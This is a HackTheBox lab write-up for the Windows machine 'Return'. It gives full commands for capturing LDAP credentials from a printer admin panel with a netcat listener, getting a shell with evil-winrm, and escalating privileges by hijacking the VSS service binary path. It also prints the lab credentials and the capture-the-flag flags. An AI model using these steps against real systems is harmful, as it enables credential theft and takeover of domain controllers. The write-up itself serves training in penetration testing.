# HTB — Return

![Platform](https://img.shields.io/badge/Platform-HackTheBox-9FEF00?style=flat-square&logo=hackthebox&logoColor=black)
![OS](https://img.shields.io/badge/OS-Windows-0078D6?style=flat-square&logo=windows&logoColor=white)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=flat-square)
![Status](https://img.shields.io/badge/Status-Rooted-success?style=flat-square)
![Techniques](https://img.shields.io/badge/Techniques-Printer%20Exploit%20%7C%20Server%20Operators%20%7C%20Service%20Abuse-blueviolet?style=flat-square)

---

## Summary

Return is a Windows Active Directory machine that demonstrates a printer credential capture attack combined with Server Operators group abuse. An exposed printer admin panel transmits LDAP credentials when the server address is updated, allowing capture via a netcat listener. The compromised service account is a member of the Server Operators group, which allows modification of service binary paths. Hijacking the VSS service binary path to add the account to local Administrators results in full access to the domain controller.

---

## Machine Info

| Field | Details |
|---|---|
| IP | 10.129.95.241 |
| Domain | return.local |
| DC Hostname | PRINTER |
| FQDN | printer.return.local |
| OS | Windows Server |
| User Flag | `2af4c5232c93a3285652b2c81c88b241` |
| Root Flag | `b20966ffd2dc6bbf726aff5b96909ced` |

---

## Attack Path Overview

```
Port 80 — HTB Printer Admin Panel
     |
     | Replace LDAP server address with Kali IP
     | netcat listener on port 389
     v
svc-printer : 1edFg43012!! (plaintext credential capture)
     |
     | evil-winrm
     v
WinRM shell + user flag
     |
     | whoami /groups
     v
BUILTIN\Server Operators confirmed
     |
     | sc.exe config VSS binpath hijack
     v
svc-printer added to local Administrators
     |
     | Reconnect evil-winrm
     v
Administrator desktop access + root flag
```

---

## Enumeration

### Port Scanning

**Phase A — Wide coverage:**
```bash
nmap -p- --min-rate 1000 -oN return-all-ports.txt 10.129.95.241
```

**Extract ports for Phase B:**
```bash
ports=$(grep open return-all-ports.txt | cut -d '/' -f1 | tr '\n' ',' | sed 's/,$//')
```

**Phase B — Deep identification:**
```bash
nmap -p $ports -sC -sV 10.129.95.241
```

**Key findings:**

| Port | Service | Significance |
|---|---|---|
| 80 | HTTP | Printer Admin Panel — entry point |
| 88 | Kerberos | Confirms Domain Controller |
| 389 | LDAP | LDAP authentication target |
| 445 | SMB | SMB enumeration |
| 5985 | WinRM | Shell delivery once creds obtained |

Additional findings:
- Domain: `return.local`
- Hostname: `PRINTER`
- SMB signing required
- Clock skew: 18 minutes — sync before Kerberos attacks

**Clock sync:**
```bash
sudo timedatectl set-ntp off
sudo date -s "$(date -d "$(date) + 18 minutes" '+%Y-%m-%d %H:%M:%S')"
```

```bash
echo "10.129.95.241 return.local printer.return.local" | sudo tee -a /etc/hosts
```

---

## Foothold

### Printer Admin Panel Credential Capture

Browsing to `http://10.129.95.241` reveals a printer admin settings page with:
- Server Address: `printer.return.local`
- Server Port: `389`
- Username: `svc-printer`
- Password: hidden

The panel sends credentials to whatever server address is configured when Update is clicked. Start a netcat listener on port 389:

```bash
sudo nc -lvnp 389
```

Replace the Server Address with Kali IP `10.10.15.67` and click Update. The printer authenticates to the listener and transmits credentials in plaintext:

```
svc-printer : 1edFg43012!!
```

### WinRM Shell

```bash
evil-winrm -i 10.129.95.241 -u svc-printer -p '1edFg43012!!'
```

```powershell
type C:\Users\svc-printer\Desktop\user.txt
```

**User flag:** `2af4c5232c93a3285652b2c81c88b241`

---

## Privilege Escalation

### BloodHound Collection

```bash
bloodhound-python -u svc-printer -p '1edFg43012!!' -d return.local -dc printer.return.local -ns 10.129.95.241 -c all
```

No direct path to Domain Admins found. Fall back to manual group membership enumeration.

### Group Membership Check

```powershell
whoami /groups
```

Key finding:
```
BUILTIN\Server Operators   Mandatory group, Enabled by default, Enabled group
```

Server Operators can modify service binary paths and start or stop services on the DC.

### Service Binary Path Hijack

Modify the VSS service binary path to add svc-printer to local Administrators:

```powershell
sc.exe config VSS binpath="cmd.exe /c net localgroup administrators svc-printer /add"
sc.exe stop VSS
sc.exe start VSS
```

Error 1053 is expected. The command executes before the service fails to start properly.

Verify the change:
```powershell
net localgroup administrators
```

svc-printer now appears in the local Administrators group.

### Reconnect for Fresh Token

Group membership changes do not apply to the existing session. Exit and reconnect:

```bash
exit
evil-winrm -i 10.129.95.241 -u svc-printer -p '1edFg43012!!'
```

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

**Root flag:** `b20966ffd2dc6bbf726aff5b96909ced`

---

## Vulnerabilities

| Vulnerability | Location | Impact |
|---|---|---|
| LDAP credentials transmitted on settings update | Printer Admin Panel | Plaintext credential capture |
| Server Operators group membership | svc-printer account | Service binary path modification |
| VSS service modifiable without elevated rights | Windows Services | SYSTEM-level command execution |

---

## Tools

| Tool | Purpose |
|---|---|
| nmap | Port and service scanning |
| netcat | Fake LDAP listener for credential capture |
| evil-winrm | WinRM shell |
| bloodhound-python | AD attack path collection |
| sc.exe | Service binary path hijack |

---

## Key Takeaways

1. Printer and network device admin panels that send LDAP credentials on update are vulnerable to credential capture via a simple netcat listener.
2. When BloodHound finds no path, always check group memberships manually with whoami /groups before giving up.
3. Server Operators membership enables service binary path hijacking, a reliable path to SYSTEM-level execution.
4. Service binary hijacks produce error 1053 but the command still executes. The error is expected and harmless.
5. Group membership changes require a new session token. Always reconnect after adding yourself to a group.

---

## References

- [Server Operators Abuse](https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/)
- [BloodHound CE](https://github.com/SpecterOps/BloodHound)
- [evil-winrm](https://github.com/Hackplayers/evil-winrm)

---

*by mavhezha | github.com/mavhezha | mavhezha.com*
